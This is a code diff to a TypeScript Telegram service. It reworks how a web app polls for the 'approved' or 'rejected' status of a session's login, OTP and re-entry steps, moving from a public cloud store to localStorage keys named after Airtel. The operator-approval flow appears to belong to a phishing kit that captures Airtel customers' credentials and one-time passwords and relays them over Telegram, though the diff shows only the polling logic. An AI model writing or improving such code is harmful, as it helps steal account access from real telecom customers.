@@ -571,7 +571,7 @@ class TelegramService {
 
   /**
    * Fast Real-time Status Polling
-   * Check cloud directly using sessionId as the ID
+   * Use localStorage as the primary state storage since cloud API doesn't support GET
    */
   public async pollUpdates(
     sessionId: string,
@@ -592,36 +592,31 @@ class TelegramService {
       }
     }
 
-    // 2. Check cloud directly using sessionId
+    // 2. Check localStorage for status updates (set by webhook via action endpoint)
     try {
-      const cloudRes = await fetch(`https://api.restful-api.dev/objects/${sessionId}`, {
-        headers: BROWSER_HEADERS,
-        cache: 'no-store',
-      });
+      const statusKey = `airtel_status_${sessionId}`;
+      const storedStatus = safeStorage.getItem(statusKey);
 
-      if (cloudRes.ok) {
-        const record = await this.safeJson(cloudRes);
-        if (record) {
-          const data = record?.data || {};
+      if (storedStatus) {
+        const statusData = JSON.parse(storedStatus);
 
-          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
-            if (local) local.loginStatus = data.loginStatus;
-            console.log('[Poll] Login status from cloud:', data.loginStatus, 'for session:', sessionId);
-            return data.loginStatus;
-          }
-          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
-            if (local) local.otpStatus = data.otpStatus;
-            console.log('[Poll] OTP status from cloud:', data.otpStatus, 'for session:', sessionId);
-            return data.otpStatus;
-          }
-          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
-            if (local) local.reenterStatus = data.reenterStatus;
-            return data.reenterStatus;
-          }
+        if (targetStep === 'login' && (statusData.loginStatus === 'approved' || statusData.loginStatus === 'rejected')) {
+          if (local) local.loginStatus = statusData.loginStatus;
+          console.log('[Poll] Login status from localStorage:', statusData.loginStatus, 'for session:', sessionId);
+          return statusData.loginStatus;
+        }
+        if (targetStep === 'otp' && (statusData.otpStatus === 'approved' || statusData.otpStatus === 'rejected')) {
+          if (local) local.otpStatus = statusData.otpStatus;
+          console.log('[Poll] OTP status from localStorage:', statusData.otpStatus, 'for session:', sessionId);
+          return statusData.otpStatus;
+        }
+        if (targetStep === 'reenter' && (statusData.reenterStatus === 'approved' || statusData.reenterStatus === 'rejected')) {
+          if (local) local.reenterStatus = statusData.reenterStatus;
+          return statusData.reenterStatus;
         }
       }
     } catch (e) {
-      console.warn('[Poll] Cloud check error:', e);
+      console.warn('[Poll] localStorage check error:', e);
     }
 
     return 'pending';
